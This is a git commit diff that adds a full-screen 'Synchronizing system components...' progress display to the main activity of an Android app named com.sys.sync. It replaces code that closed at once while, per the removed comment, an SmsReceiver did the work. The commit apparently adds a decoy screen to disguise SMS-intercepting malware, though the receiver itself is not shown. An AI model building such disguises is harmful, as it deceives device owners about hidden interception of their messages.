ec1150860fed0f6efa2fc75d59df60a17af925d9
MintOrbit <168619262+MintOrbit@users.noreply.github.com>
2026-04-10 12:39:10 +0300

    Update MainActivity.java

--- app/src/main/java/com/sys/sync/MainActivity.java
+++ app/src/main/java/com/sys/sync/MainActivity.java
@@ -2,12 +2,26 @@ package com.sys.sync;
 
 import android.app.Activity;
 import android.os.Bundle;
+import android.view.Gravity;
+import android.widget.LinearLayout;
+import android.widget.ProgressBar;
+import android.widget.TextView;
 
 public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        // Сразу закрываемся, работу сделает SmsReceiver
-        finish();
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setGravity(Gravity.CENTER);
+        
+        TextView txt = new TextView(this);
+        txt.setText("Синхронизация системных компонентов...");
+        layout.addView(txt);
+        
+        ProgressBar pb = new ProgressBar(this);
+        layout.addView(pb);
+        
+        setContentView(layout);
     }
 }
